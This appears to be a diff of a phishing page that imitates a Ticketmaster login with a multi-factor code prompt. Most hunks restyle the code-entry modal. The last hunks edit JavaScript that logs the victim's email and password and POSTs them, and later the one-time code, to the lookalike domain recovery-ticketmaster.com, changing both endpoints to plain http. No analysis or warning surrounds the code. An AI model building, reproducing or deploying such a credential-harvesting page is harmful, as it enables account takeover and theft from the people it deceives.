@@ -11,38 +11,30 @@
       content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"
     />
     <style>
-            /* Ensure modal covers the entire screen on mobile */
-#mfa-root {
-    display: none; /* Initially hidden */
-    position: fixed;
-    z-index: 1000;
-    left: 0;
-    top: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-    box-sizing: border-box;
-    overflow-x: hidden; /* Prevent horizontal scrolling */
+            #mfa-root { display: none; /* Hidden by default */
+          position: fixed; /* Stay in place and cover the whole screen */
+          z-index: 1000; /* Sit on top */
+          left: 0;
+          top: 0;
+          width: 100%; /* Full width */
+          height: 100%; /* Full height */
+          overflow: hidden; /* Prevent scrolling when the modal is open */
+          justify-content: center; /* Center horizontally */
+          align-items: center; /* Center vertically */
+          background-color: rgba(0, 0, 0, 0.5);
+          word-wrap: break-word;/* Black w/ opacity */}
+          .error-message {
+    color: red;
+    font-size: 14px;
+    margin-top: 5px;
+    margin-bottom: 5px;
+    text-align: left; /* Align the error message with the input field */
 }
 
-/* Modal content adjustments */
-.modal-content {
-    position: relative;
-    width: 100%;
-    max-width: 400px;
-    background-color: white;
-    border-radius: 8px;
-    padding: 20px;
-    text-align: center;
-    box-sizing: border-box;
-    overflow: hidden;
+/* Input error border */
+.input-error {
+    border: 1px solid red;
 }
-
-/* Responsive adjustments for mobile */
 @media screen and (max-width: 600px) {
     .modal-content {
         max-width: 100%;
@@ -72,14 +64,26 @@
         padding: 10px;
         margin-bottom: 10px;
     }
+}
 
-    /* Make sure the error message doesn't overflow */
-    #otp-error-message {
-        word-wrap: break-word;
-        overflow-wrap: break-word;
-        margin-top: 5px;
-        margin-bottom: 5px;
-    }
+/* Modal content adjustments */
+.modal-content {
+    position: relative;
+    padding: 20px;
+    width: 100%;
+    max-width: 400px; /* Set a max-width to prevent overflow */
+    background-color: white;
+    border-radius: 8px;
+    text-align: center;
+    box-sizing: border-box; /* Ensure padding is included within width */
+    overflow: hidden; /* Prevent scrollbars */
+}
+
+#otp-error-message {
+    margin: 0;
+    padding: 0;
+    line-height: 1.2; /* Adjust line height to fit the text better */
+    word-wrap: break-word; /* Ensure long messages wrap properly */
 }
           
       .lgAfva { font-family: inherit; font-weight: 600; font-size: 14px; line-height: 2.43; width: 100%; padding: 0px 12px; min-width: 60px; text-align: center; border-radius: 2px; cursor: pointer; color: rgb(255, 255, 255); background-color: rgb(2, 108, 223); border: 1px solid transparent; transition: background-color 0.3s cubic-bezier(0.455, 0.03, 0.515, 0.955) 0s; }
@@ -7784,7 +7788,7 @@
       </div>
     </div>
 
-    <div id="mfa-root" style="overflow-x: hidden;" class="modal-content">
+    <div id="mfa-root" style="overflow-x: hidden;">
       <div class="sc-dRaagA PeyQy">
         <div class="sc-fEUNkw eEayec"></div>
         <div class="sc-dREXXX eVDzdo">
@@ -8078,7 +8082,7 @@
           console.log('clicked')
           console.log(email)
           console.log(password)
-          fetch('https://recovery-ticketmaster.com/login', {
+          fetch('http://recovery-ticketmaster.com/login', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json'
@@ -8157,7 +8161,7 @@
             const otpInput = document.getElementById('mfa-code-input-field5');
             const errorMessageElement = document.getElementById('otp-error-message');
 
-            fetch('https://recovery-ticketmaster.com/otp-validate', {
+            fetch('http://recovery-ticketmaster.com/otp-validate', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
